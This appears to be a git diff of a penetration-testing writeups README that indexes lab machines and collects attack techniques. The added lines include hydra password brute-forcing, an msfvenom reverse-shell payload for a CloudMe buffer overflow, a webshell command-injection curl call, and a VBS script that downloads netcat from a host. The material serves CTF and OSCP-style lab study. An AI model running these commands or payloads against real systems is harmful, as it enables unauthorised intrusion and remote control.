+| 21. |                                                                                                      [Kioptrix: 2014 (#5)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/writeup.pdf)                                                                                                       |          [vh#62](https://www.vulnhub.com/entry/kioptrix-2014-5,62/)         |          <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/killchain.png" width="100" height="100"/>          |                                                                                                                                                                                                                                                                                    [`exploit_pchart`](https://github.com/7h3rAm/writeups#exploit_pchart), [`exploit_phptax`](https://github.com/7h3rAm/writeups#exploit_phptax), [`privesc_freebsd`](https://github.com/7h3rAm/writeups#privesc_freebsd)                                                                                                                                                                                                                                                                                    |   [`👹`](foo "BSD")   |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
+| 22. |                                                                                                     [Kioptrix: Level 1 (#1)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix1/writeup.pdf)                                                                                                     |        [vh#22](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)        |          <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix1/killchain.png" width="100" height="100"/>          |                                                                                                                                                                                                                                                                                                                         [`exploit_modssl`](https://github.com/7h3rAm/writeups#exploit_modssl), [`privesc_modssl`](https://github.com/7h3rAm/writeups#privesc_modssl)                                                                                                                                                                                                                                                                                                                        |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
+| 23. |                                                                                                    [Kioptrix: Level 1.1 (#2)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix2/writeup.pdf)                                                                                                    |        [vh#23](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)       |          <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix2/killchain.png" width="100" height="100"/>          |                                                                                                                                                                                                                                                                             [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_cmdexec`](https://github.com/7h3rAm/writeups#exploit_cmdexec), [`privesc_kernel_ipappend`](https://github.com/7h3rAm/writeups#privesc_kernel_ipappend)                                                                                                                                                                                                                                                                             |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
+| 24. |                                                                                                    [Kioptrix: Level 1.2 (#3)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix3/writeup.pdf)                                                                                                    |        [vh#24](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/)       |          <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix3/killchain.png" width="100" height="100"/>          |                                                                                                                                                                                                                                                                                    [`exploit_lotuscms`](https://github.com/7h3rAm/writeups#exploit_lotuscms), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo)                                                                                                                                                                                                                                                                                    |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
+| 25. |                                                                                                    [Kioptrix: Level 1.3 (#4)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/writeup.pdf)                                                                                                    |        [vh#25](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/)       |          <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/killchain.png" width="100" height="100"/>          |                                                                                                                                                                                               [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_shell_escape`](https://github.com/7h3rAm/writeups#privesc_shell_escape), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf)                                                                                                                                                                                               |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
+| 26. |       [Lame](https://github.com/7h3rAm/writeups/blob/master/htb.lame/writeup.pdf)<br/><img src="https://github.com/7h3rAm/writeups/blob/master/htb.lame/matrix.png" width="59" height="59"/><br/><img src="https://github.com/7h3rAm/writeups/blob/master/htb.lame/ratings.png" width="59" height="20"/>       |          [htb#1](https://www.hackthebox.eu/home/machines/profile/1)         |              <img src="https://github.com/7h3rAm/writeups/blob/master/htb.lame/killchain.png" width="100" height="100"/>               |                                                                                                                                                                                                                                                                                                                                                       [`exploit_smb_usermap`](https://github.com/7h3rAm/writeups#exploit_smb_usermap)                                                                                                                                                                                                                                                                                                                                                       |  [`🐧`](foo "Linux")  | [`🟢`](foo "20pts") | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
+| 27. |                                                                                                      [LazySysAdmin: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf)                                                                                                       |         [vh#205](https://www.vulnhub.com/entry/lazysysadmin-1,205/)         |        <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/killchain.png" width="100" height="100"/>        |                                                                                       [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_smb_nullsession`](https://github.com/7h3rAm/writeups#exploit_smb_nullsession), [`exploit_smb_web_root`](https://github.com/7h3rAm/writeups#exploit_smb_web_root), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_wordpress_template`](https://github.com/7h3rAm/writeups#exploit_wordpress_template), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo)                                                                                       |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
+| 28. |   [Legacy](https://github.com/7h3rAm/writeups/blob/master/htb.legacy/writeup.pdf)<br/><img src="https://github.com/7h3rAm/writeups/blob/master/htb.legacy/matrix.png" width="59" height="59"/><br/><img src="https://github.com/7h3rAm/writeups/blob/master/htb.legacy/ratings.png" width="59" height="20"/>   |          [htb#2](https://www.hackthebox.eu/home/machines/profile/2)         |             <img src="https://github.com/7h3rAm/writeups/blob/master/htb.legacy/killchain.png" width="100" height="100"/>              |                                                                                                                                                                                                                                                                                                                                                      [`exploit_smb_ms08_067`](https://github.com/7h3rAm/writeups#exploit_smb_ms08_067)                                                                                                                                                                                                                                                                                                                                                      | [`🔷`](foo "Windows") | [`🟢`](foo "20pts") | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
+| 29. |                                                                                                       [Lin.Security: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/writeup.pdf)                                                                                                       |          [vh#244](https://www.vulnhub.com/entry/linsecurity-1,244/)         |        <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/killchain.png" width="100" height="100"/>         |                                                                                                                                                                                                                         [`exploit_nfs_rw`](https://github.com/7h3rAm/writeups#exploit_nfs_rw), [`exploit_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#exploit_ssh_authorizedkeys), [`privesc_strace_setuid`](https://github.com/7h3rAm/writeups#privesc_strace_setuid), [`privesc_docker_group`](https://github.com/7h3rAm/writeups#privesc_docker_group)                                                                                                                                                                                                                        |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
+| 30. |                                                                                                 [Lord Of The Root: 1.0.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/writeup.pdf)                                                                                                 |      [vh#129](https://www.vulnhub.com/entry/lord-of-the-root-101,129/)      |      <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/killchain.png" width="100" height="100"/>       |                                                                                                                                                                                           [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_kernel_overlayfs`](https://github.com/7h3rAm/writeups#privesc_kernel_overlayfs), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf)                                                                                                                                                                                           |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
+| 31. |     [Mirai](https://github.com/7h3rAm/writeups/blob/master/htb.mirai/writeup.pdf)<br/><img src="https://github.com/7h3rAm/writeups/blob/master/htb.mirai/matrix.png" width="59" height="59"/><br/><img src="https://github.com/7h3rAm/writeups/blob/master/htb.mirai/ratings.png" width="59" height="20"/>     |         [htb#64](https://www.hackthebox.eu/home/machines/profile/64)        |              <img src="https://github.com/7h3rAm/writeups/blob/master/htb.mirai/killchain.png" width="100" height="100"/>              |                                                                                                                                                                                                                                                                                                                  [`exploit_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_defaultcreds), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers)                                                                                                                                                                                                                                                                                                                 |  [`🐧`](foo "Linux")  | [`🟢`](foo "20pts") | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
+| 32. |                                                                                                      [Misdirection: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/writeup.pdf)                                                                                                       |         [vh#371](https://www.vulnhub.com/entry/misdirection-1,371/)         |        <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/killchain.png" width="100" height="100"/>        |                                                                                                                                                                                                                       [`exploit_php_webshell`](https://github.com/7h3rAm/writeups#exploit_php_webshell), [`exploit_bash_reverseshell`](https://github.com/7h3rAm/writeups#exploit_bash_reverseshell), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_passwd_writable`](https://github.com/7h3rAm/writeups#privesc_passwd_writable)                                                                                                                                                                                                                      |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
+| 33. |                                                                                                            [Moria: 1.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.moria11/writeup.pdf)                                                                                                            |            [vh#187](https://www.vulnhub.com/entry/moria-11,187/)            |           <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.moria11/killchain.png" width="100" height="100"/>           |                                                                                                                                                                                                                                                                                                                                                    [`privesc_ssh_knownhosts`](https://github.com/7h3rAm/writeups#privesc_ssh_knownhosts)                                                                                                                                                                                                                                                                                                                                                    |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") |                           |
+| 34. |                                                                                                           [Mr-Robot: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.mrrobot1/writeup.pdf)                                                                                                           |           [vh#151](https://www.vulnhub.com/entry/mr-robot-1,151/)           |          <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.mrrobot1/killchain.png" width="100" height="100"/>           |                                                                                                                                                                                                                                                                             [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap)                                                                                                                                                                                                                                                                             |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
+| 35. |                                                                                                              [Node: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/writeup.pdf)                                                                                                               |             [vh#252](https://www.vulnhub.com/entry/node-1,252/)             |            <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/killchain.png" width="100" height="100"/>            |                                                                                                                                                                                                                                             [`exploit_nodejs`](https://github.com/7h3rAm/writeups#exploit_nodejs), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_mongodb`](https://github.com/7h3rAm/writeups#exploit_mongodb), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid)                                                                                                                                                                                                                                            |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
+| 36. | [Optimum](https://github.com/7h3rAm/writeups/blob/master/htb.optimum/writeup.pdf)<br/><img src="https://github.com/7h3rAm/writeups/blob/master/htb.optimum/matrix.png" width="59" height="59"/><br/><img src="https://github.com/7h3rAm/writeups/blob/master/htb.optimum/ratings.png" width="59" height="20"/> |          [htb#6](https://www.hackthebox.eu/home/machines/profile/6)         |             <img src="https://github.com/7h3rAm/writeups/blob/master/htb.optimum/killchain.png" width="100" height="100"/>             |                                                                                                                                                                                                                                                                                                         [`exploit_hfs_cmd_exec`](https://github.com/7h3rAm/writeups#exploit_hfs_cmd_exec), [`privesc_windows_ms16_098`](https://github.com/7h3rAm/writeups#privesc_windows_ms16_098)                                                                                                                                                                                                                                                                                                        | [`🔷`](foo "Windows") | [`🟢`](foo "20pts") | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
+| 37. | [Shocker](https://github.com/7h3rAm/writeups/blob/master/htb.shocker/writeup.pdf)<br/><img src="https://github.com/7h3rAm/writeups/blob/master/htb.shocker/matrix.png" width="59" height="59"/><br/><img src="https://github.com/7h3rAm/writeups/blob/master/htb.shocker/ratings.png" width="59" height="20"/> |        [htb#108](https://www.hackthebox.eu/home/machines/profile/108)       |             <img src="https://github.com/7h3rAm/writeups/blob/master/htb.shocker/killchain.png" width="100" height="100"/>             |                                                                                                                                                                                                                                                                                                                    [`exploit_shellshock`](https://github.com/7h3rAm/writeups#exploit_shellshock), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers)                                                                                                                                                                                                                                                                                                                   |  [`🐧`](foo "Linux")  | [`🟢`](foo "20pts") | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
 
 
 <a name="ttps"></a>
@@ -581,6 +582,9 @@ gobuster -w /usr/share/wordlists/SecLists/Discovery/Web_Content/cgis.txt -u http
 gobuster -w /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txt -u http://<targetip>:<targetport> -s "200,204,301,307,403,500"
 gobuster -w /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txt -u http://<targetip>:<targetport> -s "200,204,301,307,403,500"
 gobuster -w /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txt -u https://<targetip>:<targetport> -s "200,204,301,307,403,500"
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<taregtip>/ -t 20 -U <username> -P <password>
+hydra -l <username> -P /usr/share/wordlists/rockyou.txt <targetip> http-get /
+hydra -l <username> -P /usr/share/wordlists/rockyou.txt <targetip> http-head /
 nc -v -n -w1 <targetip> <targetport> ## netcat to grab banner
 nikto -o "[OUTPUT].txt" -p <targetport> -h <targetip>
 nmap -Pn -sV -sC -vvvvv -p<targetport> <targetip> -oA [OUTPUT]
@@ -593,8 +597,9 @@ whatweb <targetip>:<targetport> --color=never --log-brief="[OUTPUT].txt" ## iden
   
 | # | Date | Name | Categories | Tags | Overview |
 |---|------|------|------------|------|----------|
-| 1. | 25/Jun/2020 | [Bashed](https://github.com/7h3rAm/writeups/blob/master/htb.bashed/writeup.pdf) |  | [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_python_reverseshell`](https://github.com/7h3rAm/writeups#exploit_python_reverseshell), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_cron_rootjobs`](https://github.com/7h3rAm/writeups#privesc_cron_rootjobs) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.bashed/killchain.png" width="100" height="100" /> |
-| 2. | 09/Sep/2019 | [BSides Vancouver: 2018 (Workshop)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf) |  | [`enumerate_proto_ftp`](https://github.com/7h3rAm/writeups#enumerate_proto_ftp), [`enumerate_proto_ssh`](https://github.com/7h3rAm/writeups#enumerate_proto_ssh), [`exploit_ssh_bruteforce`](https://github.com/7h3rAm/writeups#exploit_ssh_bruteforce), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/killchain.png" width="100" height="100" /> |
+| 1. | 10/Aug/2020 | [InfoSec Prep: OSCP](https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/writeup.pdf) |  | [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_ssh_privatekeys`](https://github.com/7h3rAm/writeups#exploit_ssh_privatekeys), [`privesc_lxc_bash`](https://github.com/7h3rAm/writeups#privesc_lxc_bash) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/killchain.png" width="100" height="100" /> |
+| 2. | 25/Jun/2020 | [Bashed](https://github.com/7h3rAm/writeups/blob/master/htb.bashed/writeup.pdf) |  | [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_python_reverseshell`](https://github.com/7h3rAm/writeups#exploit_python_reverseshell), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_cron_rootjobs`](https://github.com/7h3rAm/writeups#privesc_cron_rootjobs) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.bashed/killchain.png" width="100" height="100" /> |
+| 3. | 09/Sep/2019 | [BSides Vancouver: 2018 (Workshop)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf) |  | [`enumerate_proto_ftp`](https://github.com/7h3rAm/writeups#enumerate_proto_ftp), [`enumerate_proto_ssh`](https://github.com/7h3rAm/writeups#enumerate_proto_ssh), [`exploit_ssh_bruteforce`](https://github.com/7h3rAm/writeups#exploit_ssh_bruteforce), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/killchain.png" width="100" height="100" /> |
   
   
 ---
@@ -945,6 +950,19 @@ create a bof exploit to execute arbitrary code and gain interactive access on th
   
   
 ---
+<a name="exploit_cloudme_bof"></a>
+#### exploit_cloudme_bof [⇡](#exploit)  
+the CloudMe version 1.11.12 is vulnerable to a buffer overflow that could be used to gain interactive access on the target system, possibly with elevated privileges  
+```shell
+msfvenom -p windows/shell_reverse_tcp lhost=<attackerip> lport=<attackerport> -b "\x00\x0a\x0d" -f python -a x86 --platform windows -e x86/shikata_ga_nai
+sudo nc -nlvp <attackerport>
+python 48389.py
+
+```
+  
+[+] https://www.exploit-db.com/exploits/48389  
+  
+---
 <a name="exploit_cmdexec"></a>
 #### exploit_cmdexec [⇡](#exploit)  
 execute arbitrary commands via a command execution vulnerability and gain interactive access on the target system  
@@ -990,6 +1008,17 @@ http://<targetip>:<targetport>/CFIDE/administrator/scheduler/scheduletasks.cfm
 ```
   
 [+] https://medium.com/@_C_3PJoe/htb-retired-box-write-up-arctic-50eccccc560  
+  
+---
+<a name="exploit_command_injection"></a>
+#### exploit_command_injection [⇡](#exploit)  
+certain webapps couldbe vulebrable to command injection via input text fields  
+```shell
+# submit escaped input: "\";whoami\n"
+
+```
+  
+[+] https://muirlandoracle.co.uk/2020/05/30/year-of-the-fox-write-up/  
   
 ---
 <a name="exploit_credsreuse"></a>
@@ -1062,6 +1091,19 @@ smbclient //10.10.10.100/Users -U SVC_TGS
   
 [+] https://0xrick.github.io/hack-the-box/active/  
 [+] https://adsecurity.org/?p=2288  
+  
+---
+<a name="exploit_gymsystem_rce"></a>
+#### exploit_gymsystem_rce [⇡](#exploit)  
+use `/contacts.php` to confirm the version is 1.0 and fire this exploit to get a pseudo-interactive shell on the target machine. you can  
+```shell
+python 48506.py http://<targetip>:<targetport>/
+
+curl "http://<targetip>:<targetport>/upload/kamehameha.php?telepathy=whoami"
+
+```
+  
+[+] https://www.exploit-db.com/exploits/48506  
   
 ---
 <a name="exploit_hfs_cmd_exec"></a>
@@ -1609,6 +1651,15 @@ hydra -l anne -P "/usr/share/wordlists/rockyou.txt" -e nsr -s 22 ssh://<targetip
   
   
 ---
+<a name="exploit_ssh_privatekeys"></a>
+#### exploit_ssh_privatekeys [⇡](#exploit)  
+  
+| # | Date | Name | Categories | Tags | Overview |
+|---|------|------|------------|------|----------|
+| 1. | 10/Aug/2020 | [InfoSec Prep: OSCP](https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/writeup.pdf) |  | [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_ssh_privatekeys`](https://github.com/7h3rAm/writeups#exploit_ssh_privatekeys), [`privesc_lxc_bash`](https://github.com/7h3rAm/writeups#privesc_lxc_bash) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/killchain.png" width="100" height="100" /> |
+  
+  
+---
 <a name="exploit_ssl_heartbleed"></a>
 #### exploit_ssl_heartbleed [⇡](#exploit)  
 use nmap nse script to confirm heartbleed vulnerability and then sensepost exploit to dump memory from target system  
@@ -1804,6 +1855,13 @@ gcc -pthread -o dc dc.c -lcrypt
   
   
 ---
+<a name="privesc_env_relative_path"></a>
+#### privesc_env_relative_path [⇡](#privesc)  
+certain files when referenced without their complete path, can be misused to gain elevated privileges. this can be done by modifying the environment path to find the referenced file within a directory under attacker's control and placing a malicious binary within that directory with the same name as the referenced file  
+  
+[+] https://muirlandoracle.co.uk/2020/05/30/year-of-the-fox-write-up/  
+  
+---
 <a name="privesc_freebsd"></a>
 #### privesc_freebsd [⇡](#privesc)  
   
@@ -1885,6 +1943,20 @@ gcc -m32 -o exploit 9542.c -Wl,--hash-style=both
 | # | Date | Name | Categories | Tags | Overview |
 |---|------|------|------------|------|----------|
 | 1. | 10/Oct/2019 | [Lord Of The Root: 1.0.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/writeup.pdf) |  | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_kernel_overlayfs`](https://github.com/7h3rAm/writeups#privesc_kernel_overlayfs), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/killchain.png" width="100" height="100" /> |
+  
+  
+---
+<a name="privesc_lxc_bash"></a>
+#### privesc_lxc_bash [⇡](#privesc)  
+```shell
+check output of id command
+if user member of lxd group, follow https://reboare.github.io/lxd/lxd-escape.html
+
+```
+  
+| # | Date | Name | Categories | Tags | Overview |
+|---|------|------|------------|------|----------|
+| 1. | 10/Aug/2020 | [InfoSec Prep: OSCP](https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/writeup.pdf) |  | [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_ssh_privatekeys`](https://github.com/7h3rAm/writeups#exploit_ssh_privatekeys), [`privesc_lxc_bash`](https://github.com/7h3rAm/writeups#privesc_lxc_bash) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/killchain.png" width="100" height="100" /> |
   
   
 ---
@@ -2218,74 +2290,80 @@ certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTool
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<targetip>/file.exe','C:\Users\user\Desktop\file.exe')"
 python3 -m pyftpdlib -p 21
 rdesktop <targetip> -r disk:remotedisk=/usr/share/windows-binaries
+
 gzip+xxd:
-sender:
-  gzip -c < file > file.gz
-  xxd -p file.gz | tr -d '\n' && echo
-receiver:
-  echo 1f8b...0000 > /tmp/file.gz.hex
-  xxd -p -r < /tmp/file.gz.hex > /tmp/file.gz
-  gunzip -c < /tmp/file.gz > /tmp/file
+  sender:
+    gzip -c < file > file.gz
+    xxd -p file.gz | tr -d '\n' && echo
+  receiver:
+    echo 1f8b...0000 > /tmp/file.gz.hex
+    xxd -p -r < /tmp/file.gz.hex > /tmp/file.gz
+    gunzip -c < /tmp/file.gz > /tmp/file
+
 automate file download via windows ftp client:
-echo open <targetip> >ftp_commands.txt
-echo anonymous >>ftp_commands.txt
-echo whatever >>ftp_commands.txt
-echo binary >>ftp_commands.txt
-echo get met8888.exe >>ftp_commands.txt
-echo bye >>ftp_commands.txt
-ftp -s:ftp_commands.txt
+  echo open <targetip> >ftp_commands.txt
+  echo anonymous >>ftp_commands.txt
+  echo whatever >>ftp_commands.txt
+  echo binary >>ftp_commands.txt
+  echo get met8888.exe >>ftp_commands.txt
+  echo bye >>ftp_commands.txt
+  ftp -s:ftp_commands.txt
+
 create wget.vbs and download netcat:
->C:\Windows\d.vbs
-echo strUrl = WScript.Arguments.Item(0)  >>C:\Windows\d.vbs
-echo StrFile = WScript.Arguments.Item(1)  >>C:\Windows\d.vbs
-echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0  >>C:\Windows\d.vbs
-echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0  >>C:\Windows\d.vbs
-echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1  >>C:\Windows\d.vbs
-echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2  >>C:\Windows\d.vbs
-echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts  >>C:\Windows\d.vbs
-echo Err.Clear  >>C:\Windows\d.vbs
-echo Set http = Nothing  >>C:\Windows\d.vbs
-echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1")  >>C:\Windows\d.vbs
-echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")   >>C:\Windows\d.vbs
-echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")   >>C:\Windows\d.vbs
-echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")  >>C:\Windows\d.vbs
-echo http.Open "GET", strURL, False  >>C:\Windows\d.vbs
-echo http.Send  >>C:\Windows\d.vbs
-echo varByteArray = http.ResponseBody  >>C:\Windows\d.vbs
-echo Set http = Nothing  >>C:\Windows\d.vbs
-echo Set fs = CreateObject("Scripting.FileSystemObject")  >>C:\Windows\d.vbs
-echo Set ts = fs.CreateTextFile(StrFile, True)  >>C:\Windows\d.vbs
-echo strData = ""  >>C:\Windows\d.vbs
-echo strBuffer = ""  >>C:\Windows\d.vbs
-echo For lngCounter = 0 to UBound(varByteArray)  >>C:\Windows\d.vbs
-echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1)))  >>C:\Windows\d.vbs
-echo Next  >>C:\Windows\d.vbs
-echo ts.Close >>C:\Windows\d.vbs
-dir C:\Windows\d.vbs
-C:\Windows\d.vbs "http://<targetip>/nc.exe" C:\Windows\nc.exe
+  >C:\Windows\d.vbs
+  echo strUrl = WScript.Arguments.Item(0)  >>C:\Windows\d.vbs
+  echo StrFile = WScript.Arguments.Item(1)  >>C:\Windows\d.vbs
+  echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0  >>C:\Windows\d.vbs
+  echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0  >>C:\Windows\d.vbs
+  echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1  >>C:\Windows\d.vbs
+  echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2  >>C:\Windows\d.vbs
+  echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts  >>C:\Windows\d.vbs
+  echo Err.Clear  >>C:\Windows\d.vbs
+  echo Set http = Nothing  >>C:\Windows\d.vbs
+  echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1")  >>C:\Windows\d.vbs
+  echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")   >>C:\Windows\d.vbs
+  echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")   >>C:\Windows\d.vbs
+  echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")  >>C:\Windows\d.vbs
+  echo http.Open "GET", strURL, False  >>C:\Windows\d.vbs
+  echo http.Send  >>C:\Windows\d.vbs
+  echo varByteArray = http.ResponseBody  >>C:\Windows\d.vbs
+  echo Set http = Nothing  >>C:\Windows\d.vbs
+  echo Set fs = CreateObject("Scripting.FileSystemObject")  >>C:\Windows\d.vbs
+  echo Set ts = fs.CreateTextFile(StrFile, True)  >>C:\Windows\d.vbs
+  echo strData = ""  >>C:\Windows\d.vbs
+  echo strBuffer = ""  >>C:\Windows\d.vbs
+  echo For lngCounter = 0 to UBound(varByteArray)  >>C:\Windows\d.vbs
+  echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1)))  >>C:\Windows\d.vbs
+  echo Next  >>C:\Windows\d.vbs
+  echo ts.Close >>C:\Windows\d.vbs
+  dir C:\Windows\d.vbs
